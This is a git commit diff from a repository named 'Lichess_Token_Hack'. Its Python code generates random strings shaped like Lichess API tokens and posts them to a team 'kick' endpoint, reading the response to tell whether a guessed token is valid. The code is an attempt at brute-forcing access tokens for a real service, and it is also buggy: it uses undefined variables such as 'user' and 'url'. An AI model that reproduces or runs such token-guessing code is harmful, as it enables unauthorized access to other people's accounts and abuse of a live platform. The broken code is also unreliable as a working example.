7420f6eab9d2732f576a5c5d317708283880f32f
Jonathan Skopp <zeyecx@gmail.com>
2021-04-11 21:41:16 +0200

    fix import

--- Lichess_Token_Hack/function.py
+++ Lichess_Token_Hack/function.py
@@ -1,10 +1,9 @@
 import requests
 import lichess.api
 import string
+import random
 
 # create Header
-
-
 def create_header(token):
     user = user.lower()
     url = 'https://lichess.org/team/asdadasd/kick/HaterCheaterHater'
@@ -12,18 +11,26 @@ def create_header(token):
     return header
 
 # create request
-
-
 def create_request(header):
     return requests.post(url, headers=header)
 
 
 # Analyse Request
-def analyse(request_socket):
-    if "true" in request_socket:
+def analyse(level):
+    if "true" in level:
         return True
     return False
 
+# No such token
+def status(level):
+    if "true" not in level.text: 
+        # Wrong Key
+        if "No such token" in level.text:
+            return "No such token"
+        # other Error
+        return "Unknown Error"
+    else:
+        return "No Error" 
 
 # Create cheat Token
 def cheat_token(token_example):
@@ -38,8 +45,13 @@ def cheat_token(token_example):
 
     for uppercase in string.ascii_uppercase:
         chars = chars+uppercase
-
-    for i in range(0, len(token_example)):
-        cheat_token = cheat_token + chars[random.randint(0, len(chars))]
+    
+    try:
+        for i in range(0, len(token_example)):
+            cheat_token = cheat_token + chars[random.randint(0, len(chars)-1)]
+    except:
+        cheat_token = ''
+        quit()
 
     return cheat_token
+
--- Lichess_Token_Hack/main.py
+++ Lichess_Token_Hack/main.py
@@ -1,12 +1,11 @@
-import lichess.api
-import requests
-import random
-import string
 from function import *
 
 
 # example Token
 token_example = 'IB8YzSTvpMiQHV5l'
 
+# create Cheat Token
+cheat_token = cheat_token(token_example)
 
-
+# Ausgabe
+print(cheat_token)
